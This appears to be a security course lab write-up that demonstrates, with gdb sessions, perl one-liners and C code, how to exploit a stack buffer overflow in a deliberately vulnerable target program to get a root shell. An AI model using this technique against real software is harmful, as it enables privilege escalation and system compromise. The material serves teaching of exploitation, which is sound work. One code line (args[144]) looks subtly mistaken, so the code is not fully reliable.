@@ -1,0 +1,235 @@
+Since my demonstration of solving the first exploit ended up being hard to read due to the small xterm text, here is a quick writeup of the commands I ran during the demonstration.
+
+Solving the first exploit:
+
+-Setup and start boxes as described in the handout
+
+-Take a look at the source to target1: all it's doing is copying the
+command line arguments into buf and then exiting.
+int foo(char *arg, char *out)
+{
+  strcpy(out, arg);
+  return 0;
+}
+
+int main(int argc, char *argv[])
+{
+  char buf[128];
+  if (argc != 2)
+    {
+      fprintf(stderr, "target1: argc != 2\n");
+      exit(EXIT_FAILURE);
+    }
+  foo(argv[1], buf);
+  return 0;
+}
+
+-First, we'll crash target 1:
+user@box:/tmp$ ./target1 `perl -e 'print "a"x150;'`
+Segmentation fault
+
+-The back tick character "`" causes the output of the perl command to be
+substituted on the command line, so this passes a string of 150 "a"'s to 
+target1.
+
+-Now, we'll take a look at what happens in gdb:
+user@box:/tmp$ gdb target1
+
+-First set the arguments
+(gdb) set args "`perl -e 'print "a"x150;'`"
+
+-Set a break point for the beginning of the program:
+(gdb) break main
+Breakpoint 1 at 0x8048426: file target1.c, line 14.
+
+-Run the program, and it will stop at the beginning of main
+(gdb) run
+Starting program: /tmp/target1 "`perl -e 'print "a"x150;'`"
+
+Breakpoint 1, main (argc=2, argv=0x9ffffb94) at target1.c:14
+14        if (argc != 2)
+
+-Take a look at the current stack frame
+(gdb) info frame
+Stack level 0, frame at 0x9ffffb50:
+ eip = 0x8048426 in main (target1.c:14); saved eip 0x40030dc6
+ source language c.
+ Arglist at 0x9ffffb48, args: argc=2, argv=0x9ffffb94
+ Locals at 0x9ffffb48, Previous frame's sp is 0x9ffffb50
+ Saved registers:
+  ebp at 0x9ffffb48, eip at 0x9ffffb4c
+
+-The current saved instruction pointer/return address (saved eip) is
+0x40040dc6 and is stored at address 0x9ffffb4c.  Now we'll see how that 
+changes after the call to foo.  Set a break point right after foo returns
+(gdb) disas main
+Dump of assembler code for function main:
+0x08048413 <main+0>:    push   %ebp
+0x08048414 <main+1>:    mov    %esp,%ebp
+...
+0x08048462 <main+79>:   call   0x80483f4 <foo>
+0x08048467 <main+84>:   mov    $0x0,%eax
+0x0804846c <main+89>:   leave  
+0x0804846d <main+90>:   ret    
+End of assembler dump.
+(gdb) break *0x08048467
+Breakpoint 2 at 0x8048467: file target1.c, line 20.
+
+-Resume execution, and look at the return address when it breaks
+(gdb) continue 
+Continuing.
+
+Breakpoint 2, main (argc=1633771873, argv=0x9f006161) at target1.c:20
+20        return 0;
+(gdb) info frame
+Stack level 0, frame at 0x9ffffb50:
+ eip = 0x8048467 in main (target1.c:20); saved eip 0x61616161
+ source language c.
+ Arglist at 0x9ffffb48, args: argc=1633771873, argv=0x9f006161
+ Locals at 0x9ffffb48, Previous frame's sp is 0x9ffffb50
+ Saved registers:
+  ebp at 0x9ffffb48, eip at 0x9ffffb4c
+
+-The saved eip has been overwritted by 0x61616161, which is hex for
+ "aaaa".  We want to know which bytes of buf are doing the overwritting, 
+ so we'll find buf's address and then subtract it from the saved eip's
+ address
+(gdb) x buf
+0x9ffffac0:     0x61616161
+(gdb) print 0x9ffffb4c - 0x9ffffac0
+$2 = 140
+
+-So main's saved instruction pointer starts 140 bytes after the beginning
+ of buf.  Let's verify this by overwritting it with a recognizable value
+(gdb) set args "`perl -e 'print "a"x140 . "\x12\x34\x56\x78";'`"
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /tmp/target1 "`perl -e 'print "a"x140 . "\x12\x34\x56\x78";'`"
+
+Breakpoint 1, main (argc=2, argv=0x9ffffb94) at target1.c:14
+14        if (argc != 2)
+(gdb) continue 
+Continuing.
+
+Breakpoint 2, main (argc=0, argv=0x9ffffb94) at target1.c:20
+20        return 0;
+(gdb) info frame
+Stack level 0, frame at 0x9ffffb50:
+ eip = 0x8048467 in main (target1.c:20); saved eip 0x78563412
+ source language c.
+ Arglist at 0x9ffffb48, args: argc=0, argv=0x9ffffb94
+ Locals at 0x9ffffb48, Previous frame's sp is 0x9ffffb50
+ Saved registers:
+  ebp at 0x9ffffb48, eip at 0x9ffffb4c
+
+-We have successfully overwritten the instruction pointer with
+ "\x12\x34\x56\x78", which comes out to 0x78563412 instead of 0x12345678
+ because x86 is a little endian architecture.  Now we'll jump into buf by 
+ inserting it's address into the return address.  First find it's address
+(gdb) x buf
+0x9ffffac0:     0x61616161
+
+-Write buf's address into arguments and rerun the program
+(gdb) set args "`perl -e 'print "a"x140 . "\xc0\xfa\xff\x9f";'`"
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /tmp/target1 "`perl -e 'print "a"x140 . "\xc0\xfa\xff\x9f";'`"
+
+Breakpoint 1, main (argc=2, argv=0x9ffffb94) at target1.c:14
+14        if (argc != 2)
+(gdb) continue 
+Continuing.
+
+Breakpoint 2, main (argc=0, argv=0x9ffffb94) at target1.c:20
+20        return 0;
+(gdb) stepi
+21      }
+(gdb) stepi
+0x0804846d in main (argc=Cannot access memory at address 0x61616169
+) at target1.c:21
+21      }
+(gdb) stepi
+0x9ffffac0 in ?? ()
+
+-When main exits it jumps to buf's address.  We can verify this by
+ checking what it's executing.
+(gdb) x /10c $eip
+0x9ffffac0:     97 'a'  97 'a'  97 'a'  97 'a'  97 'a'  97 'a'  97 'a'  97 'a'
+0x9ffffac8:     97 'a'  97 'a'
+(gdb) x /10i $eip
+0x9ffffac0:     popa   
+0x9ffffac1:     popa   
+0x9ffffac2:     popa   
+0x9ffffac3:     popa   
+0x9ffffac4:     popa   
+0x9ffffac5:     popa   
+0x9ffffac6:     popa   
+0x9ffffac7:     popa   
+0x9ffffac8:     popa   
+0x9ffffac9:     popa   
+
+-It's executing "a"'s, which happens to translate into the assembly
+ instruction to pop from the stack.
+
+-Now we'll write everything up in C. Open up sploit1.c  Remove "args[1] =
+ "hi there";", and replace it with the following:
+  //144 bytes required to overwrite eip, plus 1 for the final \0
+  args[1] = malloc(145);
+
+  for (i = 0; i < 145; i++) {
+    //overwrite the string with junk, to make sure there aren't any random 
+    //terminators in the string that would stop strcpy()
+    args[1][i] = 'a';
+  }
+
+  //copy shellcode into the beginning of buf
+  memcpy(args[1], shellcode, strlen(shellcode));
+
+  //overwrite the return address
+  *(unsigned int *)(args[1] + 140) = 0x12345678;
+
+  args[144] = '\0'; //add terminating \0 to the string
+
+-Because we're executing target1 from inside sploit1, the environment will be
+ different, so buf's address will be slightly different.  Run make, and then run
+ sploit1, in gdb, with the symbol file for target1 to find buf's new address
+user@box:~/sploits$ make
+gcc -ggdb   -c -o sploit1.o sploit1.c
+gcc   sploit1.o   -o sploit1
+user@box:~/sploits$ gdb -e sploit1 -s /tmp/target1
+(gdb) run
+Starting program: /home/user/sploits/sploit1 
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000c20 in ?? () from /lib/ld-linux.so.2
+
+-It breaks when execve is executed.  Set a break point for main, and then
+ find the address of buf
+(gdb) break main
+Breakpoint 1 at 0x8048426: file target1.c, line 14.
+(gdb) continue 
+Continuing.
+
+Breakpoint 1, main (argc=2, argv=0x9ffffeb4) at target1.c:14
+14      target1.c: No such file or directory.
+        in target1.c
+(gdb) x buf
+0x9ffffde0:     0x9ffffe14
+
+-buf is now at 0x9ffffde0.  Open up sploit1.c and copy in the new return
+ address in place of 0x12345678:
+  *(unsigned int *)(args[1] + 140) = 0x9ffffde0;
+
+-Now when we run the exploit, it will jump to our shellcode in buf when
+ main exits, leaving us with a root shell
+user@box:~/sploits$ make
+gcc -ggdb   -c -o sploit1.o sploit1.c
+gcc   sploit1.o   -o sploit1
+user@box:~/sploits$ ./sploit1 
+sh-2.05b# whoami
+root
+sh-2.05b# 
